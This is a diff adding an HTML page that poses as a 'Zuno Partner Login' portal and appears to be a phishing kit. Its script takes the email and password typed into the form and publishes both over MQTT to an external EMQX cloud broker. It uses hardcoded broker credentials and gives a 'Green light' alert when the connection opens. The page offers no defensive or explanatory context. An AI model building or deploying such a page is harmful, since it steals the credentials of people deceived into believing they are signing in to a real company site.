@@ -1,0 +1,240 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Zuno Partner Login</title>
+
+  <!-- Font -->
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+
+  <!-- MQTT.js (unchanged) -->
+  <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
+
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Inter', sans-serif;
+    }
+
+    body {
+      margin: 0;
+      background: #f5f7f8;
+      color: #1f2937;
+    }
+
+    /* ================= HEADER ================= */
+    header {
+      background: #ffffff;
+      border-bottom: 1px solid #e5e7eb;
+      padding: 18px 60px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+
+    header img {
+      height: 34px;
+    }
+
+    header .signin-link {
+      color: #0f766e;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    /* ================= PAGE ================= */
+    .page {
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 40px 60px;
+    }
+
+    /* ================= LOGIN CARD ================= */
+    .login-card {
+      background: #ffffff;
+      border: 1px solid #e5e7eb;
+      padding: 36px 40px;
+    }
+
+    .back {
+      color: #0f766e;
+      font-size: 14px;
+      margin-bottom: 12px;
+      display: inline-block;
+      cursor: pointer;
+    }
+
+    .login-card h2 {
+      margin: 0 0 22px;
+      font-size: 22px;
+      font-weight: 600;
+    }
+
+    .hint {
+      font-size: 14px;
+      color: #374151;
+      margin-bottom: 14px;
+    }
+
+    /* ================= FORM ================= */
+    .form-group {
+      margin-bottom: 22px;
+    }
+
+    label {
+      display: block;
+      font-size: 14px;
+      margin-bottom: 6px;
+      color: #111827;
+    }
+
+    input {
+      width: 100%;
+      border: none;
+      border-bottom: 2px solid #cbd5e1;
+      padding: 10px 4px;
+      font-size: 15px;
+      outline: none;
+      background: transparent;
+    }
+
+    input:focus {
+      border-color: #38bdf8;
+    }
+
+    .remember {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 14px;
+      margin-bottom: 26px;
+    }
+
+    .actions {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+    }
+
+    .btn {
+      background: #004b52;
+      color: #ffffff;
+      border: none;
+      padding: 12px 26px;
+      font-size: 15px;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    .forgot {
+      color: #0f766e;
+      font-size: 14px;
+      cursor: pointer;
+    }
+
+    /* ================= FOOTER ================= */
+    footer {
+      margin-top: 80px;
+      background: #111827;
+      color: #ffffff;
+      padding: 30px 60px;
+      font-size: 14px;
+      text-align: center;
+    }
+
+    /* ================= RESPONSIVE ================= */
+    @media (max-width: 768px) {
+      .page {
+        padding: 30px 20px;
+      }
+
+      header {
+        padding: 16px 20px;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- HEADER -->
+  <header>
+    <img src="assets/images/zuno.svg" alt="Zuno Logo">
+    <div class="signin-link">Sign In</div>
+  </header>
+
+  <!-- CONTENT -->
+  <div class="page">
+
+    <div class="login-card">
+
+      <div class="back">‹ Sign In</div>
+
+      <h2>Sign In</h2>
+
+      <div class="hint">Login with Screen Name or Email</div>
+
+      <!-- INPUT ID: t1 -->
+      <div class="form-group">
+        <label for="t1">Email</label>
+        <input id="t1" type="email" placeholder="@hizuno.com">
+      </div>
+
+      <!-- INPUT ID: t2 -->
+      <div class="form-group">
+        <label for="t2">Password</label>
+        <input id="t2" type="password" placeholder="">
+      </div>
+
+      <div class="remember">
+        <input type="checkbox">
+        <span>Remember  Me</span>
+      </div>
+
+      <div class="actions">
+        <button class="btn" onclick="sendDemo()">Sign In</button>
+        <div class="forgot">Forgot Password</div>
+      </div>
+
+    </div>
+
+  </div>
+
+  <!-- FOOTER -->
+  <footer>
+    For enquiries, TOLL FREE 1800 12000
+  </footer>
+
+<script>
+    const options = {
+      username: "emqx_online_test_b23ddaf1",
+      password: "b;01L3MIaf4R3_54968394fJ,a<93}63",
+      protocol: "wss",
+      port: 8084,
+      clean: true,
+      connectTimeout: 4000,
+    };
+
+    const client = mqtt.connect(
+      "wss://ya17a2d0.ala.asia-southeast1.emqxsl.com:8084/mqtt",
+      options
+    );
+
+    client.on("connect", () => {
+      alert("Green light");
+    });
+
+    function sendDemo() {
+      const v1 = document.getElementById("t1").value;
+      const v2 = document.getElementById("t2").value;
+
+      const payload = { demo: v1 };
+      const payload2 = { demo: v2, Source: "Zuno" };
+
+      client.publish("p1", JSON.stringify(payload));
+      client.publish("p1", JSON.stringify(payload2));
+    }
+  </script>
+
+</body>
+</html>
